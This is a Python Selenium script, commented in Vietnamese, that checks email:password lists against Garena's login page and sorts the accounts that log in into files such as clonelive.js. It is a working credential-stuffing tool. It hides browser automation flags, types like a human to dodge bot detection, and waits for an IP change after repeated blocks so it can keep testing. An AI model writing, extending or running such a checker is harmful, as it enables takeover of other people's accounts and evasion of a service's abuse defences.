import time
import csv
import random
import json
import os
import threading
import socket
import unicodedata
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from colorama import init, Fore, Style

# Khởi tạo colorama
init(autoreset=True)

class GarenaAccountChecker:
    def __init__(self):
        self.results = []
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.clonelive_added = 0
        self.total_accounts = 0
        self.clonelive_total_current = 0

    def log_progress(self, message, color=Fore.MAGENTA):
        """In ra thông tin tiến trình kèm timestamp để dễ theo dõi."""
        timestamp = time.strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] {message}{Style.RESET_ALL}")

    def alert_user(self, stop_event):
        """Phát âm thanh cảnh báo liên tục cho đến khi được yêu cầu dừng."""
        try:
            import winsound
            pattern = [(800, 250), (1000, 250), (1200, 250), (1000, 250)]
            while not stop_event.is_set():
                for freq, duration in pattern:
                    if stop_event.is_set():
                        break
                    winsound.Beep(freq, duration)
                    if stop_event.is_set():
                        break
                    time.sleep(0.05)
        except Exception:
            while not stop_event.is_set():
                print('\a', end='', flush=True)
                time.sleep(0.2)

    def get_current_ip(self):
        """Return current outward-facing IP if detectable."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.connect(("8.8.8.8", 80))
                return sock.getsockname()[0]
        except Exception:
            try:
                return socket.gethostbyname(socket.gethostname())
            except Exception:
                return None

    def wait_for_ip_change(self, original_ip, check_interval=0.5):
        """Pause execution until the network IP changes."""
        baseline = original_ip
        if baseline:
            self.log_progress(
                f"Tam dung cho den khi IP thay doi (hien tai: {baseline}).",
                Fore.YELLOW
            )
        else:
            self.log_progress(
                "Chua xac dinh duoc IP hien tai. Dang thu lai...",
                Fore.YELLOW
            )

        while True:
            current_ip = self.get_current_ip()
            if baseline:
                if current_ip and current_ip != baseline:
                    self.log_progress(
                        f"Phat hien IP moi: {current_ip}.",
                        Fore.GREEN
                    )
                    return current_ip
            else:
                if current_ip:
                    baseline = current_ip
                    self.log_progress(
                        f"Da xac dinh IP hien tai: {baseline}. Cho doi IP moi...",
                        Fore.YELLOW
                    )
            time.sleep(check_interval)

    def normalize_text(self, text):
        """Return lowercase text with diacritics removed for keyword matching."""
        if not text:
            return ""
        normalized = unicodedata.normalize("NFD", text)
        stripped = "".join(ch for ch in normalized if unicodedata.category(ch) != "Mn")
        return stripped.lower()

    def setup_driver(self):
        """Cấu hình và khởi tạo trình duyệt Chrome thật trên máy"""
        self.log_progress("Đang cấu hình và khởi tạo trình duyệt Chrome...", Fore.YELLOW)
        options = Options()
        options.add_argument("--incognito")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option("detach", True)

        # 👉 chỉ định đường dẫn chrome.exe trên máy bạn
        options.binary_location = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

        try:
            driver = webdriver.Chrome(
                service=Service(ChromeDriverManager().install()),
                options=options
            )
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.log_progress("Khởi tạo trình duyệt thành công.", Fore.GREEN)
            return driver
        except Exception as e:
            self.log_progress(f"Lỗi khi khởi tạo trình duyệt: {e}", Fore.RED)
            return None

    def type_like_human(self, element, text):
        """Gõ phím giống người thật"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))

    def remove_account_from_source(self, email, password, file_path="accounts.txt"):
        """Xoa tai khoan khoi file nguon de tranh kiem tra lai."""
        try:
            if not os.path.exists(file_path):
                return
            target = f"{email}:{password}"
            with open(file_path, "r", encoding="utf-8") as f:
                lines = f.readlines()
            filtered = [line for line in lines if line.strip() != target]
            if len(filtered) != len(lines):
                with open(file_path, "w", encoding="utf-8") as f:
                    f.writelines(filtered)
                self.log_progress(f"Da xoa {email} khoi {file_path}.", Fore.YELLOW)
        except Exception as e:
            self.log_progress(f"Khong the xoa {email} khoi {file_path}: {e}", Fore.YELLOW)


    def check_account(self, email, password):
        """Kiểm tra một tài khoản Garena"""
        self.log_progress(f"Bắt đầu kiểm tra tài khoản: {email}", Fore.CYAN)
        driver = self.setup_driver()
        if not driver:
            return False, "Không thể khởi tạo trình duyệt"

        try:
            login_url = "https://auth.garena.com/universal/oauth?client_id=100054&redirect_uri=https%3A%2F%2Fkientuong.lienquan.garena.vn%2Fauth%2Flogin%2Fcallback&response_type=code&"
            self.log_progress("Đang mở trang đăng nhập...", Fore.CYAN)
            start_time = time.time()
            driver.get(login_url)
            load_time = time.time() - start_time
            self.log_progress(f"Đã mở trang đăng nhập trong {load_time:.2f} giây.", Fore.CYAN)

            try:
                self.log_progress("Đang chờ form đăng nhập xuất hiện...", Fore.CYAN)
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.TAG_NAME, "input"))
                )
                self.log_progress("Đã phát hiện form đăng nhập.", Fore.GREEN)
            except Exception:
                current_url = driver.current_url.lower()
                if "blog" in current_url:
                    self.log_progress("Trang đăng nhập chuyển sang blog - có thể bị chặn.", Fore.RED)
                    return False, "Tài khoản bị chặn (blog)"
                if "access" in current_url:
                    self.log_progress("Trang thông báo access - có thể bị chặn IP.", Fore.RED)
                    return False, "IP bị chặn tạm thời"
                if "block" in current_url:
                    self.log_progress("Trang thông báo block - có thể bị chặn IP.", Fore.RED)
                    return False, "IP bị chặn, vui lòng thử lại sau"
                self.log_progress("Không tìm thấy form đăng nhập.", Fore.RED)
                return False, "Không tìm thấy form đăng nhập"

            self.log_progress("Đang chuẩn bị nhập thông tin đăng nhập...", Fore.CYAN)
            inputs = driver.find_elements(By.TAG_NAME, "input")
            if len(inputs) < 2:
                self.log_progress("Không tìm thấy đủ trường nhập liệu.", Fore.RED)
                return False, "Không tìm thấy đủ trường nhập liệu"

            email_field = inputs[0]
            email_field.clear()
            self.log_progress("Đang nhập email...", Fore.CYAN)
            self.type_like_human(email_field, email)

            email_field.send_keys(Keys.TAB)
            time.sleep(0.5)

            password_field = driver.switch_to.active_element
            self.log_progress("Đang nhập mật khẩu...", Fore.CYAN)
            password_field.send_keys(password)

            before_login_url = driver.current_url

            self.log_progress("Đang gửi yêu cầu đăng nhập...", Fore.CYAN)
            password_field.send_keys(Keys.ENTER)

            self.log_progress("Đang chờ phản hồi đăng nhập...", Fore.CYAN)
            time.sleep(6)

            after_login_url = driver.current_url
            self.log_progress(f"URL sau đăng nhập: {after_login_url}", Fore.CYAN)

            current_url_lower = after_login_url.lower()
            if "blog" in current_url_lower:
                self.log_progress("Bị chuyển hướng sang blog - tài khoản bị chặn.", Fore.RED)
                return False, "Tài khoản bị chặn (blog)"
            if "access" in current_url_lower:
                self.log_progress("Bị chặn tạm thời do IP.", Fore.RED)
                return False, "IP bị chặn tạm thời"
            if "block" in current_url_lower:
                self.log_progress("Bị chặn truy cập.", Fore.RED)
                return False, "IP bị chặn, vui lòng thử lại sau"
            if "error" in current_url_lower:
                self.log_progress("Trang báo lỗi đăng nhập.", Fore.RED)
                return False, "Lỗi đăng nhập"

            try:
                error_div = driver.find_element(
                    By.XPATH,
                    '//div[contains(@class, "error") or contains(@class, "error-message")]'
                )

                if error_div.is_displayed():
                    error_text = error_div.text.strip()
                    lower_error = error_text.lower()
                    if "sai tên tài khoản hoặc mật khẩu" in lower_error or "username or password is incorrect." in lower_error:
                        self.log_progress("Sai mật khẩu.", Fore.YELLOW)
                        return False, "SAI_PASS"
                    if "chưa xác định lỗi sai" in lower_error or "an unknown error occured." in lower_error:
                        self.log_progress("Lỗi mạng hoặc lỗi không xác định.", Fore.YELLOW)
                        return False, "NOT_INTERNET"
                    self.log_progress(f"Lỗi khác: {error_text}", Fore.YELLOW)
                    return False, f"Lỗi: {error_text}"
            except NoSuchElementException:
                self.log_progress("Không thấy thông báo lỗi hiển thị.", Fore.GREEN)
            except Exception as e:
                self.log_progress(f"Lỗi khi đọc thông báo lỗi: {e}", Fore.YELLOW)

            try:
                block_element = driver.find_element(By.XPATH, "//BODY/DIV[2]/DIV[1]")
                if block_element.is_displayed():
                    self.log_progress("Phat hien trang chan dang nhap.", Fore.RED)
                    self.remove_account_from_source(email, password)
                    return False, "CANT_LOGIN"
            except NoSuchElementException:
                pass
            except Exception as e:
                self.log_progress(f"Loi khi kiem tra chan dang nhap: {e}", Fore.YELLOW)

            if before_login_url != after_login_url:
                self.log_progress("Đăng nhập thành công, chuyển sang lấy thông tin tài khoản.", Fore.GREEN)
                self.log_progress("Đang tải trang kientuong.lienquan...", Fore.CYAN)
                time.sleep(5)

                xpaths = [
                    "//*[@id='main-body']/DIV[1]/DIV[1]/DIV[2]/DIV[2]/DIV[1]/DIV[1]",
                    "//*[@id='main-body']/DIV[1]/DIV[1]/DIV[2]/DIV[2]/DIV[1]/DIV[2]",
                    "//*[@id='main-body']/DIV[1]/DIV[1]/DIV[2]/DIV[2]/DIV[1]/DIV[3]"
                ]

                results = []
                self.log_progress("Đang thu thập dữ liệu tài khoản...", Fore.CYAN)
                for xp in xpaths:
                    try:
                        element = driver.find_element(By.XPATH, xp)
                        text = element.text.strip()
                        if not text:
                            text = (element.get_attribute("innerText") or "").strip()
                        results.append(text)
                        self.log_progress(f"Lấy dữ liệu tài khoản {xp}.", Fore.GREEN)
                    except Exception as e:
                        results.append("")
                        self.log_progress(f"Không tìm thấy {xp}: {e}", Fore.YELLOW)
                results = (results + [""] * len(xpaths))[:len(xpaths)]
                liveordie_written = False
                try:
                    line = f"{email}  ||  {password}  ||  {results[0]}  ||  {results[1]}  ||  {results[2]}\n"
                    with open("liveordie.txt", "a", encoding="utf-8") as f:
                        f.write(line)
                    liveordie_written = True
                except Exception as live_error:
                    self.log_progress(f"Không ghi được dữ liệu vào liveordie.txt: {live_error}", Fore.YELLOW)
                if not any(part.strip() for part in results):
                    self.log_progress("Không load được dữ liệu.", Fore.RED)
                    return False, "NO_DATA"
                status_text = results[2] if len(results) > 2 else ""
                normalized_status = self.normalize_text(status_text)
                locked_keywords = ("bi khoa", "khoa tai khoan", "khoa tam thoi")

                if "binh thuong" in normalized_status:
                    clonelive_path = "clonelive.js"
                    account_entry = {"username": email, "password": password}
                    try:
                        existing_accounts = []
                        if os.path.exists(clonelive_path):
                            with open(clonelive_path, "r", encoding="utf-8") as js_file:
                                raw_data = js_file.read().strip()
                                if raw_data:
                                    try:
                                        existing_accounts = json.loads(raw_data)
                                        if not isinstance(existing_accounts, list):
                                            existing_accounts = []
                                    except json.JSONDecodeError:
                                        existing_accounts = []
                        added_new = False
                        if account_entry not in existing_accounts:
                            existing_accounts.append(account_entry)
                            self.clonelive_added += 1
                            added_new = True
                        self.clonelive_total_current = len(existing_accounts)
                        with open(clonelive_path, "w", encoding="utf-8") as js_file:
                            json.dump(existing_accounts, js_file, ensure_ascii=False, indent=2)
                        if added_new:
                            self.log_progress("Thêm tài khoản Bình thường clonelive.js.", Fore.GREEN)
                        else:
                            self.log_progress("Thêm tài khoản Bình thường trong clonelive.js.", Fore.YELLOW)
                    except Exception as clone_error:
                        self.log_progress(f"Không thêm tài khoản Bình thuong clonelive.js: {clone_error}", Fore.YELLOW)
                elif any(keyword in normalized_status for keyword in locked_keywords):
                    clonedie_path = "clonedie.js"
                    account_entry = {"username": email, "password": password}
                    try:
                        existing_accounts = []
                        if os.path.exists(clonedie_path):
                            with open(clonedie_path, "r", encoding="utf-8") as js_file:
                                raw_data = js_file.read().strip()
                                if raw_data:
                                    try:
                                        existing_accounts = json.loads(raw_data)
                                        if not isinstance(existing_accounts, list):
                                            existing_accounts = []
                                    except json.JSONDecodeError:
                                        existing_accounts = []
                        added_new = False
                        if account_entry not in existing_accounts:
                            existing_accounts.append(account_entry)
                            added_new = True
                        with open(clonedie_path, "w", encoding="utf-8") as js_file:
                            json.dump(existing_accounts, js_file, ensure_ascii=False, indent=2)
                        if added_new:
                            self.log_progress(" Thêm tài khoản Bị khóa clonedie.js.", Fore.GREEN)
                        else:
                            self.log_progress("Thêm tài khoản Bị khóa trong clonedie.js.", Fore.YELLOW)
                    except Exception as clone_error:
                        self.log_progress(f"Không thể cập nhật tài khoản Bị khóa clonedie.js: {clone_error}", Fore.YELLOW)
                # In ra terminal bằng log_progress
                self.log_progress(f"Thông tin tài khoản {email} || {password}", Fore.CYAN)

                # In từng kết quả (bắt đầu từ results[1] đến results[3])
                if len(results) > 1:
                    self.log_progress(f" {results[1]}")
                if len(results) > 2:
                    self.log_progress(f" {results[2]}")
                if len(results) > 3:
                    self.log_progress(f" {results[3]}")

                # Thông báo trạng thái cuối
                if liveordie_written:
                    self.log_progress("Ghi dữ liệu vào liveordie.txt.", Fore.GREEN)
                return True, "Đăng nhập thành công"

            self.log_progress("URL không đổi sau đăng nhập - đăng nhập thất bại.", Fore.RED)
            return False, "Đăng nhập thất bại (không rõ lý do)"

        except TimeoutException:
            self.log_progress("Quá thời gian chờ tải trang.", Fore.RED)
            return False, "Lỗi: Quá thời gian chờ tải trang"
        except Exception as e:
            self.log_progress(f"Lỗi trong quá trình kiểm tra: {e}", Fore.RED)
            return False, f"Lỗi: {str(e)}"
        finally:
            self.log_progress("Đóng trình duyệt.", Fore.YELLOW)
            driver.quit()

    def process_accounts(self, input_file, output_file):
        """Xử lý danh sách tài khoản và ghi trực tiếp vào các file sau mỗi lần kiểm tra"""
        self.log_progress("Chuẩn bị các file kết quả để ghi dữ liệu.", Fore.YELLOW)
        valid_file = "clonepass.js"
        invalid_file = "cloneunpass.txt"
        notcheck_file = "notcheck.txt"

        try:
            with open(output_file, "r", encoding="utf-8") as f:
                pass
        except FileNotFoundError:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("Email  ||  Mật khẩu  ||  Trạng thái    ||  Thông báo\n")
            self.log_progress(f"Tạo mới file kết quả: {output_file}", Fore.GREEN)

        try:
            with open(input_file, "r", encoding="utf-8") as f:
                accounts = [line.strip().split(":", 1) for line in f if ":" in line]

            total = len(accounts)
            self.total_accounts = total
            self.log_progress(f"Đã tìm thấy {total} tài khoản để kiểm tra từ {input_file}.", Fore.CYAN)
            print(f"{Fore.YELLOW}Đang bắt đầu kiểm tra...{Style.RESET_ALL}\n")

            pending_invalid_records = []
            invalid_streak = []

            def flush_pending_invalid():
                nonlocal pending_invalid_records, invalid_streak
                if not pending_invalid_records:
                    return
                self.log_progress(
                    f"Đang ghi {len(pending_invalid_records)} tài khoản INVALID đang chờ.",
                    Fore.MAGENTA
                )
                for record in pending_invalid_records:
                    email = record["email"]
                    password = record["password"]
                    message = record["message"]
                    with open(notcheck_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}  ||  {message}\n")
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}  ||  {password}  ||  INVALID  ||  {message}\n")
                    self.invalid += 1
                    self.checked += 1
                    self.log_progress(
                        f"Đã cập nhật trạng thái INVALID cho {email}.",
                        Fore.MAGENTA
                    )
                pending_invalid_records = []
                invalid_streak = []

            i = 0
            while i < total:
                account = accounts[i]
                display_idx = i + 1

                if len(account) != 2:
                    flush_pending_invalid()
                    self.log_progress(
                        f"[{display_idx}/{total}] Bỏ qua dòng không hợp lệ: {':'.join(account)}",
                        Fore.YELLOW
                    )
                    with open(notcheck_file, "a", encoding="utf-8") as f:
                        f.write(f"{':'.join(account)}\n")
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(f"{account[0]}  ||  {account[1]}  ||  INVALID  ||  Dữ liệu không hợp lệ\n")
                    self.invalid += 1
                    self.checked += 1
                    i += 1
                    continue

                email = account[0].strip()
                password = account[1].strip()
                self.log_progress(
                    f"[{display_idx}/{total}] Bắt đầu kiểm tra tài khoản {email}",
                    Fore.CYAN
                )

                try:
                    success, message = self.check_account(email, password)

                    if success:
                        flush_pending_invalid()
                        self.valid += 1
                        with open(valid_file, "a", encoding="utf-8") as f:
                            f.write(f'{{"username": "{email}", "password": "{password}" }},\n')
                        self.log_progress(
                            f"[{display_idx}/{total}] {email} hợp lệ - đã ghi vào {valid_file}.",
                            Fore.GREEN
                        )
                        with open(output_file, "a", encoding="utf-8") as f:
                            f.write(f"{email}  ||  {password}  ||  VALID  ||  {message}\n")
                        self.checked += 1
                        invalid_streak.clear()

                    else:
                        if message == "SAI_PASS":
                            flush_pending_invalid()
                            self.invalid += 1
                            with open(invalid_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}:{password}\n")
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} sai mật khẩu - đã ghi vào {invalid_file}.",
                                Fore.YELLOW
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  UNPASS  ||  {message}\n")
                            self.checked += 1
                            invalid_streak.clear()

                        elif message == "NOT_INTERNET":
                            flush_pending_invalid()
                            self.invalid += 1
                            with open(notcheck_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}:{password}  ||  {message}\n")
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} gặp lỗi mạng - đã ghi vào {notcheck_file}.",
                                Fore.YELLOW
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  NOT_INTERNET  ||  {message}\n")
                            self.checked += 1
                            invalid_streak.clear()
                        elif message == "NO_DATA":
                            flush_pending_invalid()
                            self.invalid += 1
                            with open(notcheck_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}:{password}  ||  Không load được dữ liệu\n")
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} Không load được dữ liệu - đã ghi vào {notcheck_file}.",
                                Fore.YELLOW
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  INVALID  ||  Không load được dữ liệu\n")
                            self.checked += 1
                            invalid_streak.clear()


                        elif message == "CANT_LOGIN":
                            flush_pending_invalid()
                            self.invalid += 1
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} bi chan dang nhap - da xoa khoi accounts.txt.",
                                Fore.RED
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  CANT_LOGIN  ||  Chan dang nhap\n")
                            self.checked += 1
                            invalid_streak.clear()

                        else:
                            invalid_streak.append({"index": i, "email": email, "password": password})
                            pending_invalid_records.append({
                                "email": email,
                                "password": password,
                                "message": message
                            })
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} trả về INVALID: {message}",
                                Fore.RED
                            )

                            if len(invalid_streak) >= 3:
                                first = invalid_streak[0]["index"]
                                second = invalid_streak[1]["index"]
                                third = invalid_streak[2]["index"]
                                if third == i and second == i - 1 and first == i - 2:
                                    self.log_progress(
                                        "Phát hiện 3 tài khoản INVALID liên tiếp. Tạm dừng để kiểm tra lại.",
                                        Fore.RED
                                    )
                                    stop_event = threading.Event()
                                    alert_thread = threading.Thread(
                                        target=self.alert_user,
                                        args=(stop_event,),
                                        daemon=True
                                    )
                                    alert_thread.start()
                                    original_ip = self.get_current_ip()
                                    new_ip = self.wait_for_ip_change(original_ip, check_interval=0.5)
                                    stop_event.set()
                                    alert_thread.join()
                                    if new_ip:
                                        self.log_progress(
                                            f"Tiep tuc kiem tra sau khi IP thay doi thanh {new_ip}.",
                                            Fore.GREEN
                                        )
                                    else:
                                        self.log_progress(
                                            "Tiep tuc kiem tra du khong xac dinh duoc IP moi.",
                                            Fore.YELLOW
                                        )
                                    restart_index = first
                                    pending_invalid_records = []
                                    invalid_streak = []
                                    self.log_progress(
                                        f"Quay lại kiểm tra từ tài khoản thứ {restart_index + 1}.",
                                        Fore.YELLOW
                                    )
                                    i = restart_index
                                    continue

                    i += 1
                    delay = random.uniform(3, 7)
                    self.log_progress(f"Nghỉ {delay:.2f} giây trước khi kiểm tra tài khoản tiếp theo.", Fore.YELLOW)
                    self.log_progress("", Fore.YELLOW)
                    self.log_progress("", Fore.YELLOW)
                    self.log_progress("", Fore.YELLOW)
                    time.sleep(delay)

                except KeyboardInterrupt:
                    flush_pending_invalid()
                    self.log_progress("Người dùng dừng chương trình!", Fore.RED)
                    with open(notcheck_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}\n")
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}  ||  {password}  ||  INVALID  ||  Người dùng dừng chương trình\n")
                    break

            flush_pending_invalid()

        except Exception as e:
            error_msg = f"Lỗi tổng: {str(e)}"
            self.log_progress(error_msg, Fore.RED)
            with open(notcheck_file, "a", encoding="utf-8") as f:
                f.write(f"{error_msg}\n")
            with open(output_file, "a", encoding="utf-8") as f:
                f.write(f"{error_msg}\n")

    def save_results(self, output_file):
        """Lưu kết quả ra file với định dạng: Email  ||  Mật khẩu  ||  Trạng thái    ||  Thông báo"""
        self.log_progress("Đang lưu kết quả tổng hợp.", Fore.YELLOW)
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("Email  ||  Mật khẩu  ||  Trạng thái    ||  Thông báo\n")
                for row in self.results:
                    if row[2] == "VALID":
                        f.write(f"{row[0]}  ||  {row[1]}  ||  VALID    ||  {row[3]}\n")
                    else:
                        f.write(f"{row[0]}  ||  {row[1]}  ||  {row[2]}  ||  {row[3]}\n")

            self.log_progress(f"Đã lưu kết quả vào {output_file}.", Fore.GREEN)
            print(f"\n{Fore.GREEN}=== KẾT QUẢ KIỂM TRA ===")
            print(f"Tổng số tài khoản đã kiểm tra: {self.checked}")
            print(f"{Fore.GREEN}Tài khoản hợp lệ: {self.valid}")
            print(f"{Fore.RED}Tài khoản không hợp lệ: {self.invalid}")
            print(f"{Fore.YELLOW}Kết quả đã được lưu vào file: {output_file}{Style.RESET_ALL}")

        except Exception as e:
            self.log_progress(f"Lỗi khi lưu kết quả: {str(e)}", Fore.RED)
            print(f"\n{Fore.RED}Lỗi khi lưu kết quả: {str(e)}{Style.RESET_ALL}")

def main():
   print(f"""{Fore.CYAN}
  _______              _     ____              
 |__   __|            | |   |  _ \             
    | | ___   ___   __| |   | |_) | _   _ 
    | |/ _ \ / _ \ / _` |   |  _ < | | | |
    | | (_) | (_) | (_| |   | |_) || |_| |
    |_|\___/ \___/ \__,_|   |____/  \__, |
                                     __/ |
                                    |___/ 
         __          __   _____  
         \ \        / /  / ____| 
          \ \  /\  / /  | (___   
           \ \/  \/ /   \\\___ \  
            \  /\  /     |___) | 
             \/  \/     /_____/  

    {Style.RESET_ALL}""")


input_file = "accounts.txt"
output_file = "results.csv"

print(f"{Fore.YELLOW}Đang khởi tạo công cụ kiểm tra tài khoản Garena...{Style.RESET_ALL}")
checker = GarenaAccountChecker()
checker.log_progress("Bắt đầu quy trình kiểm tra tài khoản.", Fore.YELLOW)
checker.process_accounts(input_file, output_file)
clonelive_path = "clonelive.js"
try:
    if os.path.exists(clonelive_path):
        with open(clonelive_path, "r", encoding="utf-8") as js_file:
            raw_data = js_file.read().strip()
        if raw_data:
            data = json.loads(raw_data)
            if isinstance(data, list):
                checker.clonelive_total_current = len(data)
            else:
                checker.clonelive_total_current = 0
        else:
            checker.clonelive_total_current = 0
    else:
        checker.clonelive_total_current = 0
except Exception as summary_error:
    checker.log_progress(f"Không đọc được clonelive.js để tổng kết: {summary_error}", Fore.YELLOW)
    checker.clonelive_total_current = 0
checker.log_progress(f"Tổng kết clonelive.js: {checker.clonelive_added}/{checker.total_accounts} tài khoản mới ghi (tổng hiện có: {checker.clonelive_total_current}).", Fore.CYAN)
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Đã dừng chương trình do người dùng yêu cầu.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Có lỗi không mong muốn: {str(e)}{Style.RESET_ALL}")
